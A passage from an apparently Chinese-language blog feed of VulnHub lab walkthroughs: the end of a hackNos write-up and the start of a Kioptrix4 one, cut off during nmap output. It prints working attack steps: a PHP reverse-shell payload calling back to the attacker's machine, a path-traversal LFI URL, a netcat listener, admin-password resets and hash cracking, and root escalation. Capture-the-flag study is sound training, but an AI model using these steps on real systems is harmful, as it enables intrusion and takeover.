debugging,</span><br><span class="line"> * visit the Codex.</span><br><span class="line"> *</span><br><span class="line"> * @link https://codex.wordpress.org/Debugging_in_WordPress</span><br><span class="line"> */</span><br><span class="line">define( <span class="string">&#x27;WP_DEBUG&#x27;</span>, <span class="literal">false</span> );</span><br><span class="line"></span><br><span class="line">/* That<span class="string">&#x27;s all, stop editing! Happy publishing. */</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/** Absolute path to the WordPress directory. */</span></span><br><span class="line"><span class="string">if ( ! defined( &#x27;</span>ABSPATH<span class="string">&#x27; ) ) &#123;</span></span><br><span class="line"><span class="string">        define( &#x27;</span>ABSPATH<span class="string">&#x27;, dirname( __FILE__ ) . &#x27;</span>/<span class="string">&#x27; );</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/** Sets up WordPress vars and included files. */</span></span><br><span class="line"><span class="string">require_once( ABSPATH . &#x27;</span>wp-settings.php<span class="string">&#x27; );</span></span><br></pre></td></tr></table></figure>

<p>very nice，使用以下命令连接数据库</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">flag@hacknos:/$ mysql -h localhost -uwpuser -phackNos-2.com                                                                                                                                                                                </span><br><span class="line">mysql: [Warning] Using a password on the <span class="built_in">command</span> line interface can be insecure.                                                                                                                                                           </span><br><span class="line">Welcome to the MySQL monitor.  Commands end with ; or \g.                                                                                                                                                                                  </span><br><span class="line">Your MySQL connection id is 18                                                                                                                                                                                                             </span><br><span class="line">Server version: 5.7.27-0ubuntu0.18.04.1 (Ubuntu)                                                                                                                                                                                           </span><br><span class="line">                                                                                                                                                                                                                                           </span><br><span class="line">Copyright (c) 2000, 2019, Oracle and/or its affiliates. All rights reserved.                                                                                                                                                               </span><br><span class="line">                                                                                                                                                                                                                                           </span><br><span class="line">Oracle is a registered trademark of Oracle Corporation and/or its                                                                                                                                                                          </span><br><span class="line">affiliates. Other names may be trademarks of their respective                                                                                                                                                                              </span><br><span class="line">owners.                                                                                                                                                                                                                                    </span><br><span class="line">                                                                                                                                                                                                                                           </span><br><span class="line">Type <span class="string">&#x27;help;&#x27;</span> or <span class="string">&#x27;\h&#x27;</span> <span class="keyword">for</span> <span class="built_in">help</span>. Type <span class="string">&#x27;\c&#x27;</span> to clear the current input statement.                                                                                                                                                             </span><br><span class="line">                                                                                                                                                                                                                                           </span><br><span class="line">mysql&gt; show databases;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| wordpress          |</span><br><span class="line">+--------------------+</span><br><span class="line">2 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt;</span><br></pre></td></tr></table></figure>

<p>成功连接数据库，接下来查看wordpress数据库中的数据表并且查看后台user用户的密码的hash值</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql&gt; use wordpress;</span><br><span class="line">Reading table information <span class="keyword">for</span> completion of table and column names</span><br><span class="line">You can turn off this feature to get a quicker startup with -A</span><br><span class="line"></span><br><span class="line">Database changed</span><br><span class="line">mysql&gt; show tables;</span><br><span class="line">+-----------------------+</span><br><span class="line">| Tables_in_wordpress   |</span><br><span class="line">+-----------------------+</span><br><span class="line">| wp_commentmeta        |</span><br><span class="line">| wp_comments           |</span><br><span class="line">| wp_links              |</span><br><span class="line">| wp_options            |</span><br><span class="line">| wp_postmeta           |</span><br><span class="line">| wp_posts              |</span><br><span class="line">| wp_term_relationships |</span><br><span class="line">| wp_term_taxonomy      |</span><br><span class="line">| wp_termmeta           |</span><br><span class="line">| wp_terms              |</span><br><span class="line">| wp_usermeta           |</span><br><span class="line">| wp_users              |</span><br><span class="line">+-----------------------+</span><br><span class="line">12 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line">mysql&gt; select * from wp_users;</span><br><span class="line">+----+------------+------------------------------------+---------------+-----------------------+----------+---------------------+---------------------+-------------+--------------+</span><br><span class="line">| ID | user_login | user_pass                          | user_nicename | user_email            | user_url | user_registered     | user_activation_key | user_status | display_name |</span><br><span class="line">+----+------------+------------------------------------+---------------+-----------------------+----------+---------------------+---------------------+-------------+--------------+</span><br><span class="line">|  1 | user       | <span class="variable">$P</span><span class="variable">$B</span>.O0cLMNmn7EoX.JMHPnNIPuBYw6S2/ | user          | rahulgehlaut@mail.com |          | 2019-11-17 17:56:53 |                     |           0 | user         |</span><br><span class="line">+----+------------+------------------------------------+---------------+-----------------------+----------+---------------------+---------------------+-------------+--------------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br></pre></td></tr></table></figure>

<p>我试了一下将$P$B.O0cLMNmn7EoX.JMHPnNIPuBYw6S2/解密，发现无法解密，使用下面的命令修改user的密码成为user。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql&gt; update wp_users <span class="built_in">set</span> user_pass=md5(<span class="string">&quot;user&quot;</span>) <span class="built_in">where</span> user_login=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">Query OK, 1 row affected (0.05 sec)</span><br><span class="line">Rows matched: 1  Changed: 1  Warnings: 0</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from wp_users;</span><br><span class="line">+----+------------+----------------------------------+---------------+-----------------------+----------+---------------------+---------------------+-------------+--------------+</span><br><span class="line">| ID | user_login | user_pass                        | user_nicename | user_email            | user_url | user_registered     | user_activation_key | user_status | display_name |</span><br><span class="line">+----+------------+----------------------------------+---------------+-----------------------+----------+---------------------+---------------------+-------------+--------------+</span><br><span class="line">|  1 | user       | ee11cbb19052e40b07aac0ca060c23ee | user          | rahulgehlaut@mail.com |          | 2019-11-17 17:56:53 |                     |           0 | user         |</span><br><span class="line">+----+------------+----------------------------------+---------------+-----------------------+----------+---------------------+---------------------+-------------+--------------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line">mysql&gt; select * from wp_users;</span><br><span class="line">+----+------------+------------------------------------+---------------+-----------------------+----------+---------------------+---------------------+-------------+--------------+</span><br><span class="line">| ID | user_login | user_pass                          | user_nicename | user_email            | user_url | user_registered     | user_activation_key | user_status | display_name |</span><br><span class="line">+----+------------+------------------------------------+---------------+-----------------------+----------+---------------------+---------------------+-------------+--------------+</span><br><span class="line">|  1 | user       | <span class="variable">$P</span><span class="variable">$BRis7BEtqoG2Rvm0bIbgz</span>.c1fl79YI. | user          | rahulgehlaut@mail.com |          | 2019-11-17 17:56:53 |                     |           0 | user         |</span><br><span class="line">+----+------------+------------------------------------+---------------+-----------------------+----------+---------------------+---------------------+-------------+--------------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br></pre></td></tr></table></figure>
<p>$P$BRis7BEtqoG2Rvm0bIbgz.c1fl79YI.解密出来结果就是user,修改成功,登录后台.</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub76.jpg"></p>
<p>将php reverse shell中的ip修改成kali端监听的ip，然后进入wordpress后台的模板修改界面，将<br>readme.txt文件内的内容改为php reverse shell木马中的内容,然后访问readme.txt文件发现成功修改。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">set_time_limit (0);</span><br><span class="line"><span class="variable">$VERSION</span> = <span class="string">&quot;1.0&quot;</span>;</span><br><span class="line"><span class="variable">$ip</span> = <span class="string">&#x27;192.168.56.102&#x27;</span>;  // CHANGE THIS</span><br><span class="line"><span class="variable">$port</span> = 5566;       // CHANGE THIS</span><br><span class="line"><span class="variable">$chunk_size</span> = 1400;</span><br><span class="line"><span class="variable">$write_a</span> = null;</span><br><span class="line"><span class="variable">$error_a</span> = null;</span><br><span class="line"><span class="variable">$shell</span> = <span class="string">&#x27;uname -a; w; id; /bin/sh -i&#x27;</span>;</span><br><span class="line"><span class="variable">$daemon</span> = 0;</span><br><span class="line"><span class="variable">$debug</span> = 0;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub77.jpg"></p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub78.jpg"></p>
<p>然后利用之前的LFI漏洞包含该txt文件，然后kali端监听</p>
<p>浏览器执行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">192.168.56.101/tsweb/wp-content/plugins/gracemedia-media-player/templates/files/ajax_controller.php?ajaxAction=getIds&amp;cfg=../../../../../../../../../../var/www/html/tsweb/wp-content/themes/twentytwenty/readme.txt</span><br></pre></td></tr></table></figure>

<p>kali端成功返回shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc -lvp 5566</span></span><br><span class="line">listening on [any] 5566 ...</span><br><span class="line">192.168.56.101: inverse host lookup failed: Host name lookup failure</span><br><span class="line">connect to [192.168.56.102] from (UNKNOWN) [192.168.56.101] 49214</span><br><span class="line">Linux hacknos 4.15.0-70-generic <span class="comment">#79-Ubuntu SMP Tue Nov 12 10:36:11 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux</span></span><br><span class="line"> 03:45:19 up  1:45,  2 users,  load average: 0.06, 0.02, 0.00</span><br><span class="line">USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT</span><br><span class="line">flag     pts/0    192.168.56.102   02:04   13:38   0.03s  0.03s -rbash</span><br><span class="line">flag     pts/1    192.168.56.102   02:11   43:03   0.02s  0.01s mysql -h localhost -uwpuser -px xxxxxxxxxxx</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line">/bin/sh: 0: can<span class="string">&#x27;t access tty; job control turned off</span></span><br><span class="line"><span class="string">$ id</span></span><br><span class="line"><span class="string">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></span><br><span class="line"><span class="string">$ pwd</span></span><br><span class="line"><span class="string">/</span></span><br><span class="line"><span class="string">$ whoami</span></span><br><span class="line"><span class="string">www-data</span></span><br><span class="line"><span class="string">$ python -c &#x27;</span>import pty; pty.spawn(<span class="string">&quot;/bin/bash&quot;</span>)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">www-data@hacknos:/var/www/html/tsweb$ ls</span></span><br><span class="line"><span class="string">ls</span></span><br><span class="line"><span class="string">index.php        wp-blog-header.php    wp-cron.php        wp-mail.php</span></span><br><span class="line"><span class="string">license.txt      wp-comments-post.php  wp-includes        wp-settings.php</span></span><br><span class="line"><span class="string">readme.html      wp-config-sample.php  wp-links-opml.php  wp-signup.php</span></span><br><span class="line"><span class="string">wp-activate.php  wp-config.php         wp-load.php        wp-trackback.php</span></span><br><span class="line"><span class="string">wp-admin         wp-content            wp-login.php       xmlrpc.php</span></span><br></pre></td></tr></table></figure>

<ul>
<li>注意：</li>
</ul>
<p>运行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>
<p>这条命令很重要，运行后将能获得一个可交互的pty的shell,不运行的话很多命令无法执行。</p>
<p>进入到/var/backups/passbkp目录下查看md5-hash的值</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@hacknos:/var/backups/passbkp$ cat md5-hash</span><br><span class="line">cat md5-hash</span><br><span class="line"><span class="variable">$1</span><span class="variable">$rohit</span><span class="variable">$01Dl0NQKtgfeL08fGrggi0</span></span><br></pre></td></tr></table></figure>

<p>解密hash值得到!%hack41</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub79.jpg"></p>
<p>ssh登录rohit用户，找到第一个flag,user.txt</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rohit@hacknos:~$ ls</span><br><span class="line">user.txt</span><br><span class="line">rohit@hacknos:~$ cat user.txt</span><br><span class="line"><span class="comment">############################################ </span></span><br><span class="line"> __    __   _______   ______    ______             </span><br><span class="line">/  |  /  | /       | /      \  /      \   </span><br><span class="line">$$ |  $$ |/$$$$$$$/ /$$$$$$  |/$$$$$$  |</span><br><span class="line">$$ |  $$ |$$      \ $$    $$ |$$ |  </span><br><span class="line">$$ \__$$ | $$$$$$  |$$$$$$$$/ $$ |       </span><br><span class="line">$$    $$/ /     $$/ $$       |$$ |           </span><br><span class="line"> $$$$$$/  $$$$$$$/   $$$$$$$/ $$/       </span><br><span class="line">                                                                                       </span><br><span class="line">                                                                                       </span><br><span class="line">                                                                                       </span><br><span class="line"><span class="comment">############################################</span></span><br><span class="line"></span><br><span class="line">MD5-HASH : bae11ce4f67af91fa58576c1da2aad4b</span><br></pre></td></tr></table></figure>

<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>帅呆了，下面提权，找到第二个flag</p>
<p>运行下面命令寻找SUID提权可执行文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rohit@hacknos:~$ find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">/bin/su</span><br><span class="line">/bin/mount</span><br><span class="line">/bin/fusermount</span><br><span class="line">/bin/ping</span><br><span class="line">/bin/umount</span><br><span class="line">/usr/bin/traceroute6.iputils</span><br><span class="line">/usr/bin/at</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/newgidmap</span><br><span class="line">/usr/bin/pkexec</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/newuidmap</span><br><span class="line">/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/snapd/snap-confine</span><br><span class="line">/usr/lib/policykit-1/polkit-agent-helper-1</span><br></pre></td></tr></table></figure>

<p>发现/usr/bin/passwd和/usr/bin/sudo都具有SUID权限，就可以使用sudo passwd修改root账户的密码，从而实现root用户登录</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rohit@hacknos:~$ sudo passwd</span><br><span class="line">[sudo] password <span class="keyword">for</span> rohit: (输入rohit用户的密码)</span><br><span class="line">Enter new UNIX password: </span><br><span class="line">Retype new UNIX password: </span><br><span class="line">passwd: password updated successfully</span><br></pre></td></tr></table></figure>

<p>root登录</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rohit@hacknos:~$ su</span><br><span class="line">Password: </span><br><span class="line">root@hacknos:/home/rohit<span class="comment">#cd /root</span></span><br><span class="line">root@hacknos:~<span class="comment"># ls</span></span><br><span class="line">root.txt</span><br><span class="line">root@hacknos:~<span class="comment"># cat root.txt </span></span><br><span class="line"> _______                         __              __  __     <span class="comment">#</span></span><br><span class="line">/       \                       /  |            /  |/  |    <span class="comment">#</span></span><br><span class="line">$$$$$$$  |  ______    ______   _$$ |_          _$$ |$$ |_   <span class="comment">#</span></span><br><span class="line">$$ |__$$ | /      \  /      \ / $$   |        / $$  $$   |  <span class="comment">#</span></span><br><span class="line">$$    $$&lt; /$$$$$$  |/$$$$$$  |$$$$$$/         $$$$$$$$$$/   <span class="comment">#</span></span><br><span class="line">$$$$$$$  |$$ |  $$ |$$ |  $$ |  $$ | __       / $$  $$   |  <span class="comment"># </span></span><br><span class="line">$$ |  $$ |$$ \__$$ |$$ \__$$ |  $$ |/  |      $$$$$$$$$$/   <span class="comment">#</span></span><br><span class="line">$$ |  $$ |$$    $$/ $$    $$/   $$  $$/         $$ |$$ |    <span class="comment">#</span></span><br><span class="line">$$/   $$/  $$$$$$/   $$$$$$/     $$$$/          $$/ $$/     <span class="comment">#</span></span><br><span class="line"><span class="comment">#############################################################                                                          </span></span><br><span class="line">                                                          </span><br><span class="line"><span class="comment">#############################################################                                                          </span></span><br><span class="line">MD5-HASH : bae11ce4f67af91fa58576c1da2aad4b</span><br><span class="line"></span><br><span class="line">Blog : www.hackNos.com</span><br><span class="line"></span><br><span class="line">Author : Rahul Gehlaut</span><br><span class="line"></span><br><span class="line">linkedin : https://www.linkedin.com/<span class="keyword">in</span>/rahulgehlaut/</span><br><span class="line"><span class="comment">#############################################################</span></span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub80.jpg"></p>
<p>至此第二个flag已经找到，挑战结束，帅掉渣。</p>
<p>各位大虾看了觉得不错的话。请捐助我一点，不要白嫖，thanks very much.</p>
<p>(本文全网首发，google都搜不到，发布日期：2019/12/20)</p>
<p><font color="red">Game over</font></p>
<p>不好意思，这次还是没有找到希腊某位大佬的傻瓜式一键通关脚本，i am so sorry about this…It’s a pity…</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg"></p>
<p><font color="green"><strong><em>The end,to be continue…</em></strong></font></p>
]]></content>
      <categories>
        <category>vulnhub walkthrough</category>
      </categories>
      <tags>
        <tag>vulnhub靶机练习</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub靶机渗透[Kioptrix4]</title>
    <url>/2019/12/10/Kioptrix4/</url>
    <content><![CDATA[<h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>名称：Kioptrix: Level 1.3 (#4)<br>发布日期：2012年2月8日</p>
<p>下载链接:<br>Kioptrix4_vmware.rar (Size: 208 MB)<br>Download: <span class="exturl" data-url="aHR0cDovL3d3dy5raW9wdHJpeC5jb20vZGx2bS9LaW9wdHJpeDRfdm13YXJlLnJhcg==">http://www.kioptrix.com/dlvm/Kioptrix4_vmware.rar<i class="fa fa-external-link-alt"></i></span><br>Download(Mirror): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9raW9wdHJpeC9LaW9wdHJpeDRfdm13YXJlLnJhcg==">https://download.vulnhub.com/kioptrix/Kioptrix4_vmware.rar<i class="fa fa-external-link-alt"></i></span><br>Download(Torrent): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9raW9wdHJpeC9LaW9wdHJpeDRfdm13YXJlLnJhci50b3JyZW50">https://download.vulnhub.com/kioptrix/Kioptrix4_vmware.rar.torrent<i class="fa fa-external-link-alt"></i></span></p>
<p>虚拟机之间再次存在很长的延迟，但这无济于事。 工作，家庭必须是第一位的。 博客和兴趣爱好排在列表的下方。 这些事情并不像人们想象的那么容易。 必须为这些挑战投入时间和一些计划，以确保：</p>
<a id="more"></a>

<p>1.可以远程获得root权限[编辑：对不起，我的意思不是]</p>
<p>1a. 可以远程破坏机器</p>
<ul>
<li>1.停留在此网站的目标受众范围内</li>
<li>2.必须是“现实的”（好吧……）</li>
<li>3.应该为我复习。 无论是PHP还是MySQL用法等等。我已经有一段时间没做过了。</li>
</ul>
<p>我也很难导出这个。 因此，请花时间阅读本文结尾处的评论。</p>
<p>秉承事物的精神，这一挑战与其他挑战有所不同，但仍处于轻松的境界。 我知道自己重复一遍，但必须始终清楚：这些VM是针对初学者的。 这是一个起点。</p>
<p>我很想编写一些小型的自定义应用程序，以供人们使用。 但我是管理员，不是编码员。 学习/编码这样的应用程序将花费太多时间。 并不是说我永远不会尝试做一个，但我不会屏住呼吸。 如果有人想要更艰巨的挑战，我敢肯定，Inter-tube会将他们抱在某个地方。 或者，您也可以随时注册Offsec的PWB课程。无耻的插头</p>
<p>– 我必须说几件事。 我使用新平台制作了这张图片。 希望一切正常，但我无法测试所有内容。 最初，VM在启动时很难获得IP。 由于某种原因，NIC无法启动，并且机器留有环回接口。 我希望我解决了这个问题。 如果这个启动需要一点时间，请不要感到惊讶。 它正在尝试获取IP。 有点耐心。 有人为我测试了映像，还报告说VM开机后就挂了。 重新启动后一切都很好。 只有一个人报告了此消息，因此希望这不是主要问题。 如果计划在vmFusion上运行它，则可能需要转换想象以适合您的融合版本。<br>– 还为使用Hyper-V的用户添加了VHD文件以供下载。 你们可能需要将网络适配器更改为“旧版网络适配器”。 我已经对该文件进行了测试，这个文件似乎对我来说还算不错…如果您遇到问题，或者由于某种原因它无法正常工作，请发送电子邮件comms [=]kioptrix.com</p>
<p>感谢<span class="exturl" data-url="aHR0cDovL3d3dy5uMDBicGVudGVzdGluZy5jb20lRTQlQjglOEElRTclOUElODRAc2hhaV9zYWludOS9v+eUqOWQhOenjXZt6Kej5Yaz5pa55qGI6L+b6KGM5oCl6ZyA55qE5rWL6K+VLi8=">www.n00bpentesting.com上的@shai_saint使用各种VM解决方案进行急需的测试。<i class="fa fa-external-link-alt"></i></span></p>
<p>感谢Hackfest.ca的Patrick也运行了VM并报告了一些问题。 Swappage和@Tallenz也这样做。 所有的帮助都是感激的家伙</p>
<p>所以我希望你喜欢这个。</p>
<p>Kioptrix团队</p>
<p>Note:只是一个虚拟硬盘。 您需要创建一个新的虚拟机并附加现有的硬盘驱动器.</p>
<p>运行服务:</p>
<ul>
<li>Apache</li>
<li>MySQL</li>
<li>OpenSSH</li>
<li>PHP</li>
<li>Samba</li>
</ul>
<p>漏洞知识点:</p>
<ul>
<li>文件包含</li>
<li>操作系统命令注入</li>
<li>权限提升</li>
<li>特权不正确的服务</li>
<li>SQL注入</li>
</ul>
<h3 id="虚拟机与网络配置"><a href="#虚拟机与网络配置" class="headerlink" title="虚拟机与网络配置"></a>虚拟机与网络配置</h3><p>点击vmware新建虚拟机，选择ubuntu,接下来的配置，除了下图配置与平常不同，其他步骤均与平常相同</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub32.jpg"></p>
<p>.vmdk文件为压缩包中解压出的文件</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub33.jpg"></p>
<p>将虚拟靶机和kali攻击机的vmware网络都配置成[自定义：特定虚拟网络的&lt;VMnet8(NAT模式)&gt;]即可。</p>
<h4 id="信息收集-仅截取关键部分"><a href="#信息收集-仅截取关键部分" class="headerlink" title="信息收集(仅截取关键部分)"></a>信息收集(仅截取关键部分)</h4><p>上nmap</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sn -v 192.168.84.0/24</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.84.136 [host down]</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.84.137 [host down]</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.84.138 [host down]</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.84.139</span><br><span class="line">Host is up (0.0010s latency).</span><br><span class="line">MAC Address: 00:0C:29:F3:0E:E9 (VMware)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.84.140 [host down]</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.84.141 [host down]</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.84.142 [host down]</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.84.143 [host down]</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -A -v -sS -Pn -T4 --script=vuln 192.168.84.139</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Scanning 192.168.84.139 [1000 ports]</span><br><span class="line">Discovered open port 139/tcp on 192.168.84.139</span><br><span class="line">Discovered open port 80/tcp on 192.168.84.139</span><br><span class="line">Discovered open port 22/tcp on 192.168.84.139</span><br><span class="line">Discovered open port 445/tcp on 192.168.84.139</span><br><span class="line">Completed SYN Stealth Scan at 20:57, 2.09s elapsed (1000 total ports)</span><br><span class="line">Initiating Service scan at 20:57</span><br><span class="line">Scanning 4 services on 192.168.84.139</span><br><span class="line">Completed Service scan at 20:57, 11.02s elapsed (4 services on 1 host)</span><br><span class="line">Initiating OS detection (try <span class="comment">#1) against 192.168.84.139</span></span><br><span class="line">NSE: Script scanning 192.168.84.139.</span><br><span class="line">Initiating NSE at 20:57</span><br><span class="line">Stats: 0:02:49 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan</span><br><span class="line">NSE: Active NSE Script Threads: 3 (3 waiting)</span><br><span class="line">NSE Timing: About 99.42% <span class="keyword">done</span>; ETC: 20:59 (0:00:01 remaining)</span><br><span class="line">Completed NSE at 21:02, 311.88s elapsed</span><br><span class="line">Initiating NSE at 21:02</span><br><span class="line">Completed NSE at 21:02, 0.12s elapsed</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.84.139</span><br><span class="line">Host is up (0.00036s latency).</span><br><span class="line">Not shown: 566 closed ports, 430 filtered ports</span><br><span class="line">PORT    STATE SERVICE     VERSION</span><br><span class="line">22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">| vulners: </span><br><span class="line">|   cpe:/a:openbsd:openssh:4.7p1: </span><br><span class="line">|       CVE-2010-4478   7.5     https://vulners.com/cve/CVE-2010-4478</span><br><span class="line">|       CVE-2017-15906  5.0     https://vulners.com/cve/CVE-2017-15906</span><br><span class="line">|       CVE-2016-10708  5.0     https://vulners.com/cve/CVE-2016-10708</span><br><span class="line">|       CVE-2010-4755   4.0     https://vulners.com/cve/CVE-2010-4755</span><br><span class="line">|_      CVE-2008-5161   2.6     https://vulners.com/cve/CVE-2008-5161</span><br><span class="line">80/tcp  open  http        Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">| http-csrf: </span><br><span class="line">| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.84.139</span><br><span class="line">|   Found the following possible CSRF vulnerabilities: </span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.84.139:80/</span><br><span class="line">|     Form id: myusername</span><br><span class="line">|     Form action: checklogin.php</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.84.139:80/checklogin.php</span><br><span class="line">|     Form id: </span><br><span class="line">|     Form action: index.php</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.84.139:80/index.php</span><br><span class="line">|     Form id: myusername</span><br><span class="line">|_    Form action: checklogin.php</span><br><span class="line">|_http-dombased-xss: Couldn<span class="string">&#x27;t find any DOM based XSS.</span></span><br><span class="line"><span class="string">| http-enum: </span></span><br><span class="line"><span class="string">|   /database.sql: Possible database backup</span></span><br><span class="line"><span class="string">|   /icons/: Potentially interesting folder w/ directory listing</span></span><br><span class="line"><span class="string">|   /images/: Potentially interesting directory w/ listing on &#x27;</span>apache/2.2.8 (ubuntu) php/5.2.4-2ubuntu5.6 with suhosin-patch<span class="string">&#x27;</span></span><br><span class="line"><span class="string">|_  /index/: Potentially interesting folder</span></span><br><span class="line"><span class="string">|_http-server-header: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch</span></span><br><span class="line"><span class="string">| http-slowloris-check: </span></span><br><span class="line"><span class="string">|   VULNERABLE:</span></span><br><span class="line"><span class="string">|   Slowloris DOS attack</span></span><br><span class="line"><span class="string">|     State: LIKELY VULNERABLE</span></span><br><span class="line"><span class="string">|     IDs:  CVE:CVE-2007-6750</span></span><br><span class="line"><span class="string">|       Slowloris tries to keep many connections to the target web server open and hold</span></span><br><span class="line"><span class="string">|       them open as long as possible.  It accomplishes this by opening connections to</span></span><br><span class="line"><span class="string">|       the target web server and sending a partial request. By doing so, it starves</span></span><br><span class="line"><span class="string">|       the http server&#x27;</span>s resources causing Denial Of Service.</span><br><span class="line">|       </span><br><span class="line">|     Disclosure date: 2009-09-17</span><br><span class="line">|     References:</span><br><span class="line">|       http://ha.ckers.org/slowloris/</span><br><span class="line">|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750</span><br><span class="line">|_http-stored-xss: Couldn<span class="string">&#x27;t find any stored XSS vulnerabilities.</span></span><br><span class="line"><span class="string">|_http-trace: TRACE is enabled</span></span><br><span class="line"><span class="string">|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)</span></span><br><span class="line"><span class="string">| vulners: </span></span><br><span class="line"><span class="string">|   cpe:/a:apache:http_server:2.2.8: </span></span><br><span class="line"><span class="string">|       CVE-2010-0425   10.0    https://vulners.com/cve/CVE-2010-0425</span></span><br><span class="line"><span class="string">|       CVE-2011-3192   7.8     https://vulners.com/cve/CVE-2011-3192</span></span><br><span class="line"><span class="string">|       CVE-2017-7679   7.5     https://vulners.com/cve/CVE-2017-7679</span></span><br><span class="line"><span class="string">|       CVE-2013-2249   7.5     https://vulners.com/cve/CVE-2013-2249</span></span><br><span class="line"><span class="string">|       CVE-2009-1891   7.1     https://vulners.com/cve/CVE-2009-1891</span></span><br><span class="line"><span class="string">|       CVE-2009-1890   7.1     https://vulners.com/cve/CVE-2009-1890</span></span><br><span class="line"><span class="string">|       CVE-2012-0883   6.9     https://vulners.com/cve/CVE-2012-0883</span></span><br><span class="line"><span class="string">|       CVE-2018-1312   6.8     https://vulners.com/cve/CVE-2018-1312</span></span><br><span class="line"><span class="string">|       CVE-2013-1862   5.1     https://vulners.com/cve/CVE-2013-1862</span></span><br><span class="line"><span class="string">|       CVE-2014-0231   5.0     